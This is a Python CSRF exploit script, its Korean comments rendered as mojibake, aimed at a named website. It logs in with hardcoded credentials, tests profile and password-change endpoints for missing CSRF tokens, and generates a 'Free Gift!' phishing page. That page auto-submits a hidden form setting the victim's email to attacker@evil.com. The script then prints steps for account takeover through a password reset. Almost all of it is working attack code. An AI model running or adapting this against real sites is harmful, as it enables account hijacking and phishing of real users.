#!/usr/bin/env python3
"""
CSRF Attack - í”¼í•´ì ì´ë©”ì¼ ë³€ê²½ â†’ ê³„ì • íƒˆì·¨
XSS/SQLi ì—†ì´ ì„¸ì…˜ íƒˆì·¨í•˜ëŠ” ë°©ë²•
"""

import requests
import sys

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    END = '\033[0m'
    BOLD = '\033[1m'

class CSRFExploit:
    def __init__(self, base_url):
        self.base_url = base_url

    def generate_csrf_html(self, attacker_email):
        """CSRF HTML í˜ì´ì§€ ìƒì„± - í”¼í•´ìê°€ í´ë¦­í•˜ë©´ ì´ë©”ì¼ ë³€ê²½ë¨"""

        html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Free Gift!</title>
</head>
<body>
    <h1>ğŸ ë¬´ë£Œ ê²½í’ˆ ë‹¹ì²¨! í´ë¦­í•˜ì„¸ìš”!</h1>

    <form id="csrf" action="{self.base_url}/update_profile.php" method="POST">
        <input type="hidden" name="email" value="{attacker_email}">
        <input type="hidden" name="full_name" value="Hacked">
    </form>

    <script>
        // ìë™ ì „ì†¡
        document.getElementById('csrf').submit();
    </script>
</body>
</html>"""

        return html

    def test_csrf_protection(self):
        """CSRF ë³´í˜¸ ì—¬ë¶€ í…ŒìŠ¤íŠ¸"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[1] CSRF ë³´í˜¸ í…ŒìŠ¤íŠ¸{Colors.END}\n")

        # aliceë¡œ ë¡œê·¸ì¸
        session = requests.Session()
        data = {'username': 'alice', 'password': 'alice2024'}
        response = session.post(
            f"{self.base_url}/login.php",
            data=data,
            allow_redirects=True
        )

        if 'index.php' in response.url:
            print(f"{Colors.GREEN}âœ“ aliceë¡œ ë¡œê·¸ì¸ ì„±ê³µ{Colors.END}\n")

            # í”„ë¡œí•„ ì—…ë°ì´íŠ¸ ì‹œë„ (CSRF í† í° ì—†ì´)
            print(f"{Colors.YELLOW}CSRF í† í° ì—†ì´ í”„ë¡œí•„ ì—…ë°ì´íŠ¸ ì‹œë„...{Colors.END}")

            update_data = {
                'email': 'attacker@evil.com',
                'full_name': 'CSRF Test'
            }

            response = session.post(
                f"{self.base_url}/update_profile.php",
                data=update_data,
                allow_redirects=True
            )

            if 'attacker@evil.com' in response.text or response.status_code == 200:
                print(f"{Colors.GREEN}âœ“ CSRF ì·¨ì•½! í† í° ì—†ì´ ì—…ë°ì´íŠ¸ ì„±ê³µ!{Colors.END}\n")
                print(f"{Colors.CYAN}â†’ CSRF HTML í˜ì´ì§€ë¥¼ ë§Œë“¤ì–´ì„œ í”¼í•´ìì—ê²Œ ë³´ë‚´ë©´ ê³„ì • íƒˆì·¨ ê°€ëŠ¥{Colors.END}\n")
                return True
            else:
                print(f"{Colors.RED}âœ— CSRF ë³´í˜¸ë˜ì–´ ìˆìŒ (í† í° í•„ìš”){Colors.END}\n")
                return False
        else:
            print(f"{Colors.RED}âœ— ë¡œê·¸ì¸ ì‹¤íŒ¨{Colors.END}\n")
            return False

    def test_password_change_csrf(self):
        """ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ CSRF í…ŒìŠ¤íŠ¸"""
        print(f"\n{Colors.BOLD}{Colors.PURPLE}[2] ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ CSRF í…ŒìŠ¤íŠ¸{Colors.END}\n")

        session = requests.Session()
        data = {'username': 'alice', 'password': 'alice2024'}
        session.post(f"{self.base_url}/login.php", data=data, allow_redirects=True)

        # ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ì‹œë„
        print(f"{Colors.YELLOW}ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ì‹œë„ (CSRF)...{Colors.END}")

        endpoints = [
            "/change_password.php",
            "/update_password.php",
            "/settings.php",
        ]

        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            print(f"  Testing: {endpoint}")

            try:
                change_data = {
                    'old_password': 'alice2024',
                    'new_password': 'hacked123',
                    'confirm_password': 'hacked123'
                }

                response = session.post(url, data=change_data, allow_redirects=True, timeout=10)

                if response.status_code == 200:
                    print(f"{Colors.GREEN}    âœ“ 200 OK - ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ê°€ëŠ¥ì„± ìˆìŒ{Colors.END}")

                    # ë³€ê²½ëœ ë¹„ë°€ë²ˆí˜¸ë¡œ ë¡œê·¸ì¸ í…ŒìŠ¤íŠ¸
                    test_session = requests.Session()
                    login_data = {'username': 'alice', 'password': 'hacked123'}
                    test_response = test_session.post(
                        f"{self.base_url}/login.php",
                        data=login_data,
                        allow_redirects=True
                    )

                    if 'index.php' in test_response.url:
                        print(f"{Colors.GREEN}    âœ“âœ“âœ“ ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ì„±ê³µ! CSRF ì·¨ì•½!{Colors.END}\n")

                        # ì›ë˜ëŒ€ë¡œ ë³µêµ¬
                        restore_data = {
                            'old_password': 'hacked123',
                            'new_password': 'alice2024',
                            'confirm_password': 'alice2024'
                        }
                        session.post(url, data=restore_data)
                        print(f"{Colors.CYAN}    (ë¹„ë°€ë²ˆí˜¸ ë³µêµ¬ ì™„ë£Œ){Colors.END}\n")
                        return True

            except Exception as e:
                pass

        print()
        return False

def main():
    print(f"\n{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}ğŸ£ CSRF Exploit - ê³„ì • íƒˆì·¨{Colors.END}")
    print(f"{Colors.BOLD}{Colors.PURPLE}{'='*80}{Colors.END}\n")

    TARGET = "http://healthmash.net"
    ATTACKER_EMAIL = "attacker@evil.com"

    print(f"{Colors.BLUE}Target: {TARGET}{Colors.END}")
    print(f"{Colors.BLUE}Attacker Email: {ATTACKER_EMAIL}{Colors.END}\n")

    exploit = CSRFExploit(TARGET)

    # í…ŒìŠ¤íŠ¸ ì‹¤í–‰
    csrf_vulnerable = exploit.test_csrf_protection()
    password_vulnerable = exploit.test_password_change_csrf()

    # CSRF HTML ìƒì„±
    if csrf_vulnerable or password_vulnerable:
        print(f"\n{Colors.BOLD}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.GREEN}âœ“ CSRF ì·¨ì•½ì  ë°œê²¬!{Colors.END}")
        print(f"{Colors.BOLD}{'='*80}{Colors.END}\n")

        html = exploit.generate_csrf_html(ATTACKER_EMAIL)

        with open('csrf_attack.html', 'w') as f:
            f.write(html)

        print(f"{Colors.GREEN}âœ“ CSRF ê³µê²© í˜ì´ì§€ ìƒì„±: csrf_attack.html{Colors.END}\n")
        print(f"{Colors.YELLOW}ë‹¤ìŒ ë‹¨ê³„:{Colors.END}")
        print(f"1. csrf_attack.htmlì„ ì›¹ ì„œë²„ì— ì—…ë¡œë“œ")
        print(f"2. í”¼í•´ìì—ê²Œ ë§í¬ ì „ì†¡")
        print(f"3. í”¼í•´ìê°€ í´ë¦­í•˜ë©´ ì´ë©”ì¼ì´ {ATTACKER_EMAIL}ë¡œ ë³€ê²½ë¨")
        print(f"4. ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì •ìœ¼ë¡œ ê³„ì • íƒˆì·¨\n")
    else:
        print(f"\n{Colors.RED}âœ— CSRF ë³´í˜¸ë˜ì–´ ìˆìŒ{Colors.END}\n")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}âš  ì¤‘ë‹¨ë¨{Colors.END}")
        sys.exit(0)
